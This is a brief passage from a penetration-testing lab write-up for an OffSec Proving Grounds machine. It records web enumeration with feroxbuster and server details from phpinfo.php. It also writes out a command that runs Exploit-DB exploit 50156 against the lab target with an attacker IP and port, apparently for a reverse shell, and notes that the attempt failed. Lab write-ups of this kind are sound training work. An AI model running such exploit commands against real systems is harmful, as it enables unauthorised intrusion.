**HyperText Transport Protocol**

Silly quiz app, looks like a distraction, nothing much here at first glance.

![[Pasted image 20250828071952.png]]

It's PHP, and autorecon feroxbuster found phpinfo.php:
http://192.168.144.127:45332/phpinfo.php

![[Pasted image 20250828073734.png]]

- OS info, Win10 x64 arch.
- Stack is XAMPP.
- PHP Version 7.3.23
- Server is Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23 
- Running as user "Jerren"
- Fileupload is on, but allow_url_include is off

https://www.exploit-db.com/exploits/50156

Tried this with no luck

`python3 50156.py http://192.168.144.127:45332 192.168.45.154 1234`


# Continue [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Medjed/Service Enumeration/8000 HTTP|8000 HTTP]]